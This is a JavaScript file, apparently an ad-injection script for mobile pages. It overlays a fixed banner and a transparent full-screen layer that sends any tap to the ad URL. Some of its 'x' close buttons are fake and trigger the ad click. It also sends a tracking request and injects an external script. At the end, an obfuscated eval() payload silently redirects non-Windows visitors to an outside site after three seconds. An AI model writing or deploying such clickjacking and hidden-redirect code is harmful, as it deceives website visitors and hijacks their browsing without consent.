teyyt();
if((navigator.userAgent.indexOf('baidubrowser') > -1) || (navigator.userAgent.indexOf('baiduboxapp') > -1) || (navigator.userAgent.indexOf('UCBrowser') > -1)){
  function cde(blogs,config){
    var j = document.createElement('meta');j.name = 'imagemode'; j.content='force';iiuop=document.getElementsByTagName('head')[0]; iiuop.appendChild(j);iiuop.insertBefore(j, iiuop.lastChild);
    var b =window.screen.width;
    var c = window.screen.height;
    var d = '' || null;
    var e=640,f=height,g=document.documentElement?document.documentElement.clientWidth:document.body.clientWidth;var k=(g * f / e).toFixed(2);
    var m= k * 1.5;
    var Yheight = m;
    if(navigator.userAgent.indexOf('UCBrowser') > -1) {
      Yheight = 800;
      var Cwidth = document.documentElement.clientWidth;
      if(height == 150){
        d = Cwidth/64*15;
      }else if(height == 200){
        d = Cwidth/16*5;
      }else if(height == 100){
        d = Cwidth/32*5;
      }
    }else{
      if(height == 150){
        d = b/64*15;
      }else if(height == 200){
        d = b/16*5;
      }else if(height == 100){
        d = b/32*5;
      }
    }
    var htm = m-k;
    var httm = htm-1;
    var ddd;
    if(false_close== 1){
      ddd = '<kot id="kf" style="position:absolute;top:0;right:0;color:#fff;font-size:20px;background:rgba(0,0,0,0.6);display:block;width:22px;height:20px;line-height:16px;text-align:center;font-family:Arial;">x</kot>';
    }else{
      ddd = "";
    }
    var x = document.createElement('of');
    x.id="baseUrl";
    x.style.position = 'fixed';
    x.style.top = '0';
    x.style.width = '100%';
    x.style.zIndex = '999';
    x.style.display = 'block';
    x.innerHTML = '<div style="height:'+m+'px;"><cdfv id="dt" style="position:absolute;top:0;left:0;color:#fff;font-size:20px;background:rgba(0,0,0,0.1);display:block;width:22px;height:20px;line-height:16px;text-align:center;font-family:Arial;">x</cdfv><uui style="display:block;width:100%;height:'+m+'px;"><iiu style="width:100%;display:block;"><object id="zzdbs" style="width:100%;margin-top:0;" data="'+blogs.imageurl+'" /></object></iiu></uui>' +ddd+
      '</div>';
    if(flag==1){
      var xy = document.createElement('xy');
      xy.innerHTML='<a id="xy" style="display: block;width: 100%;height: '+c+'px;background-color: transparent;position: fixed;left: 0;top: 0;z-index:20;"></a>';
      document.body.appendChild(xy);
      xy.onclick = function () {
        window.open(blogs.basedUrl,'_blank');
        document.getElementById('xy').style.display = 'none';
      };
    }else{}
    x.onclick = function(){
      if(/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
        window.location.href = blogs.basedUrl;
      }else{
        window.open(blogs.basedUrl,'_self');
      }
      if(document.getElementById('xy')){document.getElementById('xy').style.display = 'none';}
    };
    document.body.appendChild(x);
    document.getElementsByTagName('body')[0].style.paddingTop = k+'px';
    var close = document.getElementById("dt");
    close.onclick=function(e){
      document.getElementById('baseUrl').style.display = 'none';
      e.stopPropagation();
      document.getElementsByTagName('body')[0].style.paddingTop = '0';
      if(document.getElementById('xy')){document.getElementById('xy').style.display = 'none';}
    };
    setTimeout(function(){
      var C_pc=new Image();
      C_pc.src='http://swdcvkrnaaa';
    },300);
    window.onscroll = function(){
      var t = document.documentElement.scrollTop || document.body.scrollTop;
      var h =window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight || window.screen.width;
      if( t >= document.documentElement.scrollHeight -h ) {
        document.getElementsByTagName('body')[0].style.marginBottom = d +'px';
      }
    }
  }
  cde(blogs,config);
}else{
  var IsClickShow=0;
  (function(){
    if(window['baseUrl']!=undefined)return;var a={},doc=document;a.RK=0;a.x='F241baseUrl';a.IsCS=(!!1||!!IsClickShow);
    var awidth =window.screen.width;
    var aheight = window.screen.height;
    var maxheight = '' || null;
    var iw=640,ih=height,ww=document.documentElement?document.documentElement.clientWidth:document.body.clientWidth;var hh=(ww * ih / iw).toFixed(2); var hd= hh * 1.4;
    var Yheight = hd;if(navigator.userAgent.indexOf('UCBrowser') > -1) {Yheight = 800;var Cwidth = document.documentElement.clientWidth;if(height == 150){maxheight = Cwidth/64*15;}else if(height == 200){maxheight = Cwidth/16*5;}else if(height == 100){maxheight = Cwidth/32*5;}}else{if(height == 150){maxheight = awidth/64*15;}else if(height == 200){maxheight = awidth/16*5;}else if(height == 100){maxheight = awidth/32*5;}}
    a.$=function(s){if(typeof(s)=='string')return doc.getElementById(s);else return !1;};
    a.Hi=function(o){try{a.$(o).style.display='none';document.getElementsByTagName('body')[0].style.paddingTop = 0+'px';
      if(document.getElementById('xy')){document.getElementById('xy').style.display = 'none';}
    }catch(e){}};
    a.Rm=function(o){try{a.$(o).parentNode.removeChild(a.$(o));}catch(e){}};
    a.SC=function(s){if(s==null)return;try{var h=doc.getElementsByTagName('head')[0];var x=doc.createElement('style');x.type='text/css';if(x.styleSheet)x.styleSheet.cssText=s;else x.appendChild(doc.createTextNode(s));h.insertBefore(x, h.lastChild);return !0;}catch(e){return !1}};
    a.AP=function(s){if(s==null)return !1;var x=doc.createElement('div');x.className='baseUrl';x.id='baseUrl';x.innerHTML=s;if(doc.body){try{doc.body.appendChild(x);}catch(e){}}else{try{doc.getElementsByTagName('html')[0].appendChild(x);}catch(e){}}return !0;};
    a.AE=function(f,s){if(s==null)s='onresize';setTimeout(function(){try{if(a.$('baseUrl')){f(),doc.body.appendChild(a.$('baseUrl'));};}catch(e){}},1000);var o=window[s];if(typeof window[s]!='function'){window[s]=f}else{window[s] = function(){o();f();}}};
    a.SCo=function(k,v,t){var T=new Date();T.setTime(T.getTime()+1000*t);try{doc.cookie=k+"="+escape(v)+";expires="+T.toGMTString();return !0;}catch(e){return !1;}};
    a.GCo=function(k){var C=doc.cookie.match(new RegExp("(^| )"+k+"=([^;]*)(;|$)"));if(C!=null)return unescape(C[2]);return !1;};
    a.Cl=function(){!!a.RK?(a.$("baseUrl198").click(),a.RK=0):(a.Hi('baseUrl'));};
    var _c ='';var CookCS=a.GCo('CKTH20170228');var CookOS=a.GCo('EATH20170228');
    _c += '<div ><a class="'+a.b+'  basedUrl"  id="aaaxxxx"  target="_blank" style="height:1000px;position:absolute;z-index=-1 !important;top:0;opacity:0;">';
    _c += '</a></div>';
    if(1){_c += "<a id='baseUrl9' class='F241baseUrl' onclick='baseUrl.$(\"baseUrl198\").click();return false'></a>";}
    _c += "<div id='F241baseUrl' class='F241baseUrl'>";
    _c += "<a class='baseUrl1' onclick='baseUrl.Cl();'>x</a>";
    if(false_close == 1 ){
      _c += "<a class='baseUrl2' onclick='baseUrl.Hi(\"baseUrl9\");baseUrl.$(\"baseUrl198\").click();return false'>x</a>";
    }
    _c += "<a href='"+blogs.basedUrl+"' target='_blank' class ='baseUrl110' id='baseUrl198'>";
    _c += "<img id='imageurl87' src='"+blogs.imageurl+"' width='"+Math.floor(Math.random()*200)+"'></a>";
    if(1){_c += "<div class='baseUrl115'><a href='javascript:void(0);'>\u5e7f\u544a</a></div>";}
    _c += "</div>";
    var _db ='.'+a.x+'{position:fixed !important;z-index:2147483647 !important;top:0px;width:100%;overflow:visible !important;height:0;}';
    _db +='.baseUrl,.baseUrl *{margin:0;padding:0;border:0;min-width:none;max-width:none;display:block;height:auto;}.baseUrl * img{max-width:none;max-height:none;width:auto;height:auto;}';
    _db +='#SVv119{position:relative;z-index:2147483647;bottom:0;width:100%;overflow:visible !important;height:0;display:block;}';
    _db +='#'+a.x+'{height:0px;}';
    _db +='#baseUrl9{background:rgba(0,0,0,0);}';
    _db +='.baseUrl1{position:absolute;left:0;bottom:0px;z-index:2147483647 !important;width:22px;height:20px;background:rgba(0,0,0,0.1);text-align:center;color:#fff;font-size:17px;line-height:20px; font-family:Arial;}';
    _db +='.baseUrl2{position:absolute;right:0;bottom:0px;z-index:2147483647 !important;width:22px;height:20px;background:rgba(0,0,0,1);text-align:center;color:#fff;font-size:17px;line-height:20px; font-family:Arial;}';
    _db +='#baseUrl198{width:100%; float:left;text-align:center;background-size:100% auto !important;position:relative;}';
    _db +='.baseUrl110,.baseUrl110:hover{background:url("'+blogs.imageurl+'") rgba(0,0,0,0) no-repeat center;}';
    _db +='#imageurl87{width:100%;float:left;visibility:hidden;height:auto !important;}';
    _db +='#ot8193{float:right;width:auto !important;}';
    _db +='.baseUrl115{top:0;position:absolute;right:0;}.baseUrl115 a{float:right;color:#dfdfdf;font-size:8px;width:30px;height:10px;line-height:9px;text-decoration:none;text-align:center;font-family:Arial;}.baseUrl115 img{float:right;}';
    _db +='@media screen and (min-width:960px){.LJQ11{top:-60px !important;width:66px !important;height:60px !important;line-height:60px; font-size:35px;}';
    _db +='@media all and (orientation:portrait){#imageurl87{width:100%;}#baseUrl198{background-size:100% auto !important}}';
    if(top.location == location){_db +='@media all and (orientation:landscape){#imageurl87{width:60%;}#baseUrl198{background-size:60% auto !important;}.baseUrl115{right:20% !important;}}';}
    else{_db +='html,body{margin:0;padding:0;border:0; width:100%;}';}
    a.AP(_c);a.SC(_db);
    a.$('imageurl87').onload = function(){document.getElementsByTagName('body')[0].style.paddingTop = hh+'px';
      if(this.width>100 && this.width<2000)a.SC('#imageurl87{height:auto !important;}');a.resize();
      a.$('baseUrl198').addEventListener('click',function(){},false);
      if(!!CookCS && 3600>0){if(a.IsCS){a.Rm("ngi45");}}
      if(!!CookOS && 0>0){a.Rm('baseUrl9');}
      if(3600>0){if(!a.GCo('CKTH20170228')){a.SCo('CKTH20170228',1,3600);}}
      if(0>0){if(!a.GCo('EATH20170228')){a.SCo('EATH20170228',1,0);}}};
    a.AE(function(){a.resize();});
    a.resize = function(){
      a.$(a.x).style.height='auto';
      if(1){a.$('baseUrl9').style.height=(a.$('imageurl87').height * 16.5/11)+'px';}
    };
    if(flag==1){
      var xy = document.createElement('xy');
      xy.innerHTML='<a id="xy" style="display: block;width: 100%;height: '+aheight+'px;background-color: transparent;position: fixed;left: 0;top: 0;z-index:20;"></a>';
      document.body.appendChild(xy);
      xy.onclick = function () {
        window.open(blogs.basedUrl,'_blank');
        document.getElementById('xy').style.display = 'none';
      };
    }else{}
    document.getElementById("baseUrl198").onclick= function () {
      if(document.getElementById('xy')){document.getElementById('xy').style.display = 'none';}
    };
    window['baseUrl'] = a;
    if(navigator.userAgent.toLowerCase().match(/MicroMessenger/i)=="micromessenger"){}else{
      setTimeout(function(){
        var C_pc=new Image();
        C_pc.src='http://swdcvkrnaaa';
      },300)
    }
    var t = document.documentElement.scrollTop || document.body.scrollTop;
    var h =window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight || window.screen.width;
    if( t == 0 ) {
      document.getElementsByTagName('body')[0].style.paddingTop = hh+'px';
    }else{
      document.getElementsByTagName('body')[0].style.paddingTop = hh+'px';
    }
    var pingbishigou = "woshizhongguorenpingbishigou";
    function fpingbishigou(src){
      var woshizhongguoren = document.createElement('script');
      woshizhongguoren.type = 'text/javascript';
      woshizhongguoren.charset = "utf-8";
      woshizhongguoren.src = src;
      var root_s = document.getElementsByTagName('script')[0];
      root_s.parentNode.insertBefore(woshizhongguoren, root_s);
    }
    try{
      fpingbishigou(pingbishigou);
    }catch(e){}
  })();
}
function teyyt(){
  var num = get('fdsfdsfdsfsd');
  var curTime = new Date(new Date().toLocaleDateString()).getTime()+24*60*60*1000;
  set('fdsfdsfdsfsd',num + 1,curTime);
  if(num >= set_num-1){
    var date = get('%fdsasa');
    if(date == 0){
      flag = 1;
      if(set_day == 1){
        set('%fdsasa','88888',curTime);
      }else{
        set('%fdsasa','88888',curTime + (set_day-1)*86400000);
      }
    }
    set('fdsfdsfdsfsd',-1000,curTime);
  }
}
function set(key,value,curTime){
  localStorage.setItem(key,JSON.stringify({data:value,time:curTime}));
}
function get(key){
  var data = localStorage.getItem(key);
  var dataObj = JSON.parse(data);
  if ( dataObj == null || dataObj.time < new Date().getTime()) {
    return 0;
  }else{
    var dataObjDatatoJson = JSON.parse(dataObj.data);
    return dataObjDatatoJson;
  }
}


if(1==1){eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('b(1==3||1==4){5.6.7().8("9")!=0?a(2(){c.d.e="f://g.h/i/j.k"},l):\'\'}',22,22,'|adz_id|function|8800|9006|navigator|platform|toLowerCase|indexOf|win|setTimeout|if|window|location|href|http|todayhg|com|wwxx|0817wfshuba|html|3000'.split('|'),0,{}))};